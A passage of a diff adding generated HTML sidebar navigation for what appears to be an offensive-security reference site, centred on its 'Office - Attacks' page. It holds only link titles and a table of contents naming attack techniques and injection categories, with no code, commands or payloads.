+      <a href="../../Insecure%20Deserialization/Ruby/" class="md-nav__link">
+        Ruby Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_22" type="checkbox" id="__nav_22" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_22">
+          Insecure Direct Object References
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Direct Object References" data-md-level="1">
+        <label class="md-nav__title" for="__nav_22">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Direct Object References
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Direct%20Object%20References/" class="md-nav__link">
+        Insecure Direct Object References
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_23" type="checkbox" id="__nav_23" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_23">
+          Insecure Management Interface
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Management Interface" data-md-level="1">
+        <label class="md-nav__title" for="__nav_23">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Management Interface
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Management%20Interface/" class="md-nav__link">
+        Insecure management interface
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_24" type="checkbox" id="__nav_24" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_24">
+          Insecure Source Code Management
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Source Code Management" data-md-level="1">
+        <label class="md-nav__title" for="__nav_24">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Source Code Management
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Source%20Code%20Management/" class="md-nav__link">
+        Insecure source code management
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_25" type="checkbox" id="__nav_25" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_25">
+          JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="JSON Web Token" data-md-level="1">
+        <label class="md-nav__title" for="__nav_25">
+          <span class="md-nav__icon md-icon"></span>
+          JSON Web Token
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JSON%20Web%20Token/" class="md-nav__link">
+        JWT - JSON Web Token
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_26" type="checkbox" id="__nav_26" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_26">
+          Java RMI
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java RMI" data-md-level="1">
+        <label class="md-nav__title" for="__nav_26">
+          <span class="md-nav__icon md-icon"></span>
+          Java RMI
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%20RMI/" class="md-nav__link">
+        Java RMI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_27" type="checkbox" id="__nav_27" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_27">
+          Kubernetes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Kubernetes" data-md-level="1">
+        <label class="md-nav__title" for="__nav_27">
+          <span class="md-nav__icon md-icon"></span>
+          Kubernetes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Kubernetes/" class="md-nav__link">
+        Kubernetes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_28" type="checkbox" id="__nav_28" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_28">
+          LDAP Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LDAP Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_28">
+          <span class="md-nav__icon md-icon"></span>
+          LDAP Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../LDAP%20Injection/" class="md-nav__link">
+        LDAP injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_29" type="checkbox" id="__nav_29" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_29">
+          LaTeX Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LaTeX Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_29">
+          <span class="md-nav__icon md-icon"></span>
+          LaTeX Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../LaTeX%20Injection/" class="md-nav__link">
+        LaTex Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_30" type="checkbox" id="__nav_30" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_30">
+          Methodology and Resources
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Methodology and Resources" data-md-level="1">
+        <label class="md-nav__title" for="__nav_30">
+          <span class="md-nav__icon md-icon"></span>
+          Methodology and Resources
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Active%20Directory%20Attack/" class="md-nav__link">
+        Active Directory Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bind%20Shell%20Cheatsheet/" class="md-nav__link">
+        Bind Shell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
+        AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
+        Azure Active Directory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
+        Cobalt Strike
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Container%20-%20Docker%20Pentest/" class="md-nav__link">
+        Docker Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Escape%20Breakout/" class="md-nav__link">
+        Application Escape and Breakout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Hash%20Cracking/" class="md-nav__link">
+        Hash Cracking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Linux%20-%20Persistence/" class="md-nav__link">
+        Linux - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Linux - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
+        MSSQL Server
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Metasploit%20-%20Cheatsheet/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20enumeration/" class="md-nav__link">
+        Bug Hunting Methodology and Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Miscellaneous%20-%20Tricks/" class="md-nav__link">
+        Miscellaneous & Tricks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Network%20Discovery/" class="md-nav__link">
+        Network Discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Network%20Pivoting%20Techniques/" class="md-nav__link">
+        Network Pivoting Techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Office - Attacks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Office - Attacks
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlsm-hot-manchego" class="md-nav__link">
+    XLSM - Hot Manchego
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlm-macrome" class="md-nav__link">
+    XLM - Macrome
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlm-excel-40-sharpshooter" class="md-nav__link">
+    XLM Excel 4.0 - SharpShooter
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlm-excel-40-excelntdonut" class="md-nav__link">
+    XLM Excel 4.0 - EXCELntDonut
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlm-excel-40-exec" class="md-nav__link">
+    XLM Excel 4.0 - EXEC
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-metasploit" class="md-nav__link">
+    DOCM - Metasploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-download-and-execute" class="md-nav__link">
+    DOCM - Download and Execute
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-macro-creator" class="md-nav__link">
+    DOCM - Macro Creator
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-c-converted-to-office-vba-macro" class="md-nav__link">
+    DOCM - C# converted to Office VBA macro
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-vba-wscript" class="md-nav__link">
+    DOCM - VBA Wscript
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-vba-shell-execute-comment" class="md-nav__link">
+    DOCM - VBA Shell Execute Comment
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-vba-spawning-via-svchostexe-using-scheduled-task" class="md-nav__link">
+    DOCM - VBA Spawning via svchost.exe using Scheduled Task
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-wmi-com-functions" class="md-nav__link">
+    DOCM - WMI COM functions
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docmxlm-macro-pack-macro-and-dde" class="md-nav__link">
+    DOCM/XLM - Macro Pack - Macro and DDE
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-badassmacros" class="md-nav__link">
+    DOCM - BadAssMacros
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-cactustorch-vba-module" class="md-nav__link">
+    DOCM - CACTUSTORCH VBA Module
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-mmg-with-custom-dl-exec" class="md-nav__link">
+    DOCM - MMG with Custom DL + Exec
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-activex-based-inkpicture-control-painted-event-autorun-macro" class="md-nav__link">
+    DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vba-obfuscation" class="md-nav__link">
+    VBA Obfuscation
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vba-purging" class="md-nav__link">
+    VBA Purging
+  </a>
+  
+    <nav class="md-nav" aria-label="VBA Purging">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#officepurge" class="md-nav__link">
+    OfficePurge
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evilclippy" class="md-nav__link">
+    EvilClippy
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vba-offensive-security-template" class="md-nav__link">
+    VBA - Offensive Security Template
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vba-amsi" class="md-nav__link">
+    VBA - AMSI
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docx-template-injection" class="md-nav__link">
+    DOCX - Template Injection
+  </a>
+  
+    <nav class="md-nav" aria-label="DOCX - Template Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#remote-template" class="md-nav__link">
+    Remote Template
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#template-injections-tools" class="md-nav__link">
+    Template Injections Tools
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docx-dde" class="md-nav__link">
+    DOCX - DDE
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#slk-excel" class="md-nav__link">
+    SLK - Excel
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Powershell%20-%20Cheatsheet/" class="md-nav__link">
+        Powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
+        Reverse Shell Cheat Sheet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Source%20Code%20Management/" class="md-nav__link">
+        Source Code Management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Subdomains%20Enumeration/" class="md-nav__link">
+        Subdomains Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
+        AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
+        Windows - Download and execute methods
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Mimikatz/" class="md-nav__link">
+        Windows - Mimikatz
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Persistence/" class="md-nav__link">
+        Windows - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Windows - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Using%20credentials/" class="md-nav__link">
+        Windows - Using credentials
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_31" type="checkbox" id="__nav_31" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_31">
+          NoSQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="NoSQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_31">
+          <span class="md-nav__icon md-icon"></span>
+          NoSQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../NoSQL%20Injection/" class="md-nav__link">
+        NoSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_32" type="checkbox" id="__nav_32" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_32">
+          OAuth
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="OAuth" data-md-level="1">
+        <label class="md-nav__title" for="__nav_32">
+          <span class="md-nav__icon md-icon"></span>
+          OAuth
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OAuth/" class="md-nav__link">
+        OAuth
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_33" type="checkbox" id="__nav_33" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_33">
+          Open Redirect
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Open Redirect" data-md-level="1">
+        <label class="md-nav__title" for="__nav_33">
+          <span class="md-nav__icon md-icon"></span>
+          Open Redirect
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Open%20Redirect/" class="md-nav__link">
+        Open URL Redirection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_34" type="checkbox" id="__nav_34" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_34">
+          Race Condition
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Race Condition" data-md-level="1">
+        <label class="md-nav__title" for="__nav_34">
+          <span class="md-nav__icon md-icon"></span>
+          Race Condition
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Race%20Condition/" class="md-nav__link">
+        Race Condition
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_35" type="checkbox" id="__nav_35" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_35">
+          Request Smuggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Request Smuggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_35">
+          <span class="md-nav__icon md-icon"></span>
+          Request Smuggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Request%20Smuggling/" class="md-nav__link">
+        Request Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_36" type="checkbox" id="__nav_36" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_36">
+          SAML Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SAML Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_36">
+          <span class="md-nav__icon md-icon"></span>
+          SAML Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SAML%20Injection/" class="md-nav__link">
+        SAML Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_37" type="checkbox" id="__nav_37" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_37">
+          SQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_37">
+          <span class="md-nav__icon md-icon"></span>
+          SQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/" class="md-nav__link">
+        SQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
+        Google BigQuery SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
+        Cassandra Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
+        DB2 Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
+        Hibernate Query Language Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
+        MSSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
+        MYSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
+        Oracle SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
+        PostgreSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
+        SQLite Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_38" type="checkbox" id="__nav_38" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_38">
+          Server Side Request Forgery
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Request Forgery" data-md-level="1">
+        <label class="md-nav__title" for="__nav_38">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Request Forgery
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Request%20Forgery/" class="md-nav__link">
+        Server-Side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_39" type="checkbox" id="__nav_39" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_39">
+          Server Side Template Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Template Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_39">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Template Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Template%20Injection/" class="md-nav__link">
+        Templates Injections
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_40" type="checkbox" id="__nav_40" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_40">
+          Tabnabbing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Tabnabbing" data-md-level="1">
+        <label class="md-nav__title" for="__nav_40">
+          <span class="md-nav__icon md-icon"></span>
+          Tabnabbing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tabnabbing/" class="md-nav__link">
+        Tabnabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_41" type="checkbox" id="__nav_41" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_41">
+          Type Juggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Type Juggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_41">
+          <span class="md-nav__icon md-icon"></span>
+          Type Juggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Type%20Juggling/" class="md-nav__link">
+        PHP Juggling type and magic hashes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42" type="checkbox" id="__nav_42" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42">
+          Upload Insecure Files
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Upload Insecure Files" data-md-level="1">
+        <label class="md-nav__title" for="__nav_42">
